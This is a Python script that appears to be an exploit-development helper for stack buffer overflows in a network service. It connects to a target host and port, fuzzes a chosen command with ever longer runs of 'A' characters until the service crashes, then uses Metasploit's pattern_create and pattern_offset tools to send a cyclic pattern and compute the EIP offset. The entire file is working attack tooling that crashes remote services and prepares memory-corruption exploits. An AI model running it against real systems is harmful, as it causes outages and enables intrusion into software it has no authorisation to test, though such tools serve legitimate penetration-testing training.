#!/usr/bin/python3.9

# basic use of this script, find the command to fuzz then let it run till crash
# let it use the metasploit framework tool to make a string for it to crash with again
# after that crash enter the characters within the eip and it will provide the offset

import socket
import subprocess
import argparse
from time import sleep

parser = argparse.ArgumentParser()
parser.add_argument('host', help="Server address")
parser.add_argument('port', type=int, help="Port of server")
args = parser.parse_args()

def connection_init():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    check = s.connect_ex((args.host, args.port))

    if check:
        print('Issue connection to server: %s' % check)
        connection = False
    else:
        print(s.recv(1024).decode())
        connection = True
    return s,connection

def send_message(s, payload):
    s.send(payload.encode())


def overflow_tools():
    while True:
        tool = input('tools> ')
        if tool == 'fuzzer':
            command = input('Enter the command to fuzz: ')
            fuzzer(command)
        elif tool == 'manual':
            manual_fuzz()
        elif tool == 'shell':
            break
        elif tool == 'check':
            connection_init()
    return

def manual_fuzz():
    command = input('Enter command: ')
    chars = input('Enter number of characters to send: ')
    payload = ''.join([command, ' ', 'A' * int(chars)])
    s,connection = connection_init()
    send_message(s, payload)


def fuzzer(command):
    crash = ''
    buffer = ''
    rough_fuzzing = True
    fine_fuzzing = True
    while rough_fuzzing:
        try:
            crash = crash + 'A'*300
            payload = ''.join([command, ' ', crash])
            s,connection = connection_init()
            send_message(s, payload)
            print('%d %s' % (len(crash), s.recv(1024).decode()))
            buffer = crash
            sleep(1)
        except:
            print('Crashes between %d and %d bytes' % (len(buffer), len(crash)))
            rough_fuzzing = False
            cont = input('Restart the server then hit enter to continue.')
    
    print('Checking connection')
    s,connection = connection_init()
    test = input('Send test command: ')
    send_message(s, test)
    print(s.recv(1024).decode())

    script = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb'
    arg1 = '-l'
    arg2 = str(len(crash))
    offset_pattern = subprocess.run([script, arg1, arg2], capture_output=True)
    print(offset_pattern.stdout.decode())
    payload = ''.join([command, ' ', offset_pattern.stdout.decode()])
    send_message(s, payload)

    script = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb'
    arg3 = '-q'
    eip_chars = input('Enter the characters in the EIP after the crash: ')
    offset_find = subprocess.run([script, arg1, arg2, arg3, eip_chars], capture_output=True)
    print(offset_find.stdout.decode())


if __name__ == '__main__':

    s,connection = connection_init()

    while connection:
        message = input('-> ')
        print(message)
        if message == 'tools':
            overflow_tools()
            connection_init()
        else:
            send_message(s, message)
            print(s.recv(1024).decode())
    
    s.close()


